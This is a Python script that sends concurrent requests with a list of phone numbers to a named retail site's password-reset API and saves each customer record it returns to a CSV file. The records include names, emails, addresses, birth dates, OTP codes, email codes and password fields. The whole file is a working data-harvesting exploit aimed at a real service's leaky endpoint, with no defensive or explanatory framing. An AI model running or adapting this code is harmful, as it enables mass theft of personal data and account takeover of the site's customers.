import progressbar
import aiofiles
import aiohttp
import asyncio
import time
import json
import csv

# Login otp header
login_otp_header = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Host': 'www.graceonline.in',
}

# File name
file_name = 'AUTH/user_data.txt'

# Something went wrong file
went_wrong = 'AUTH/number_lists.txt'

# Resouces
resource = 'registered_numbers.txt'

# URLs
user_data_url = 'https://www.graceonline.in/api/gr/v1/forgot'

# Progress bar
bar = None

def start_progressbar(count=10000):
    global bar

    bar = None
 
    bar = progressbar.ProgressBar(max_value=count, 
                                widgets=None).start()

# Updating progress bar
def update_progressbar(i):
    global bar

    bar.update(i)

# Keys
keys = {
    "ID": "id",
    "DISPLAY ID": "cust_showid",
    "NAME": "cust_name",
    "GROUP ID": "cust_groupid",
    "MOBILE": "cust_mobile",
    "ALTERNATE MOBILE": "cust_mobile1",
    "EMAIL": "cust_email",
    "IMAGE": "cust_img",
    "OTP": "cust_otp",
    "OTP COUNT": "cust_otp_count",
    "EMAIL CODE": "cust_emailcode",
    "SLUG": "cust_slug",
    "VERIFY STATUS": "cust_verifystatus",
    "PASSWORD STATUS": "cust_pwdstatus",
    "PASSWORD": "cust_password",
    "GRACE COINS": "cust_gracecoins",
    "PINCODE": "cust_pincode",
    "AREA": "cust_area",
    "AREA ID": "cust_areaid",
    "CITY": "cust_city",
    "STATE": "cust_state",
    "COUNTRY": "cust_country",
    "ADDRESS": "cust_address",
    "GPLUS": "cust_gplus",
    "FB": "cust_fb",
    "FB ID": "cust_fbid",
    "GPLUS ID": "cust_gplusid",
    "LOGIN WITH": "cust_loginwith",
    "WHATSAPP": "cust_wapp",
    "GENDER": "cust_gender",
    "MARITAL STATUS": "cust_maritalstatus",
    "DOB": "cust_dob",
    "ANNIVERSARY DATE": "cust_annivdate",
    "FAMILY COUNT": "cust_familycount",
    "BLOOD GROUP": "cust_bloodgrp",
    "PREFERENCES": "cust_preferences",
    "PREFERENCES STATUS": "cust_prefstatus",
    "DNTSTATUS": "cust_dntstatus",
    "CREATED BY": "cust_createby",
    "EDIT BY": "cust_editby",
    "POSTDATE": "cust_posteddate",
    "LAST EDIT": "cust_lastedit",
    "EDITIP": "cust_editip",
    "STATUS": "cust_status",
    "INCORRECT PASSWORD": "incorrect_password",
    "DND STATUS EMAIL": "dnd_status_email",
    "DND STATUS SMS": "dnd_status_sms"
}

# Processed numbers
processed = []

# Get user details
async def get_user_data(mobile, loop = False):
    global processed

    try:

        url = user_data_url + '?forgot_mobile=' + mobile

        async with aiohttp.ClientSession() as session:
            async with session.get(
                url=url,
                headers=login_otp_header
            ) as r:
                
                res = await r.text()

                if r.status != 200:

                    if loop:
                        return 'Server Error 500'
                    
                    while True:
                        rl = await get_user_data(mobile, True)

                        if type(rl) == dict:
                            return rl
                
                data = json.loads(res)

                if data['success'] == 1:
                    values = ''

                    for x in keys:
                        if x == 'ID':
                            if data['customer'].get(keys[x]) == None:
                                async with aiofiles.open(file=went_wrong, mode='a') as f:
                                    await f.write(str(mobile) + '\n')

                                    return {'error': 1, 'message': str(mobile) + ' SOMETHING WENT WRONG'}

                        values += (str(data['customer'][keys[x]]) if data['customer'].get(keys[x]) != None else '').strip('\n') + (',' if x != 'dnd_status_sms' else '') 

                    if len(values) <= 0:
                        async with aiofiles.open(file=went_wrong, mode='a') as f:
                            await f.write(str(mobile) + '\n')

                            return {'error': 1, 'message': str(mobile) + ' SOMETHING WENT WRONG'}
                        
                    values = str(values.encode('ascii', errors='ignore')).strip('\n')

                    return {'error': 0, 'message': values}

                async with aiofiles.open(file=went_wrong, mode='a') as f:
                    await f.write(str(mobile) + '\n')

                    return {'error': 1, 'message': str(mobile) + ' SOMETHING WENT WRONG'}
    except Exception as e:

        if loop:
            return 'Server Error 500'
        
        while True:
            rl = await get_user_data(mobile, True)

            if type(rl) == dict:
                return rl

async def main():

    # Header
    header = ''
    for x in keys:
        header += x + (',' if x != 'DND STATUS SMS' else '')

    header += '\n'

    # User data file
    with open(file=file_name, mode='a') as f:
        f.write(header)


    # Registered mobile numbers
    with open(file=resource, encoding='cp437', newline='') as csvfile:
        reader = csv.DictReader(csvfile)
        reader = list(reader)

        for i in range(0, len(reader), 100):
            process_lists = reader[i:i+100]

            start_progressbar(100)

            print('Processing numbers from ', i, 'to', i + 100, 'over', len(reader), 'numbers that we found')

            tasks = [asyncio.ensure_future(get_user_data(row['phone'])) for row in process_lists]
            responses = await asyncio.gather(*tasks)

            for response in responses:
                if response['error'] == 0:
                    with open(file=file_name, mode='a') as f:
                        f.write(response['message'] + '\n')

if __name__ == "__main__":
    s = time.perf_counter()
    asyncio.run(main())
    elapsed = time.perf_counter() - s
    print(f"{__file__} executed in {elapsed:0.2f} seconds.")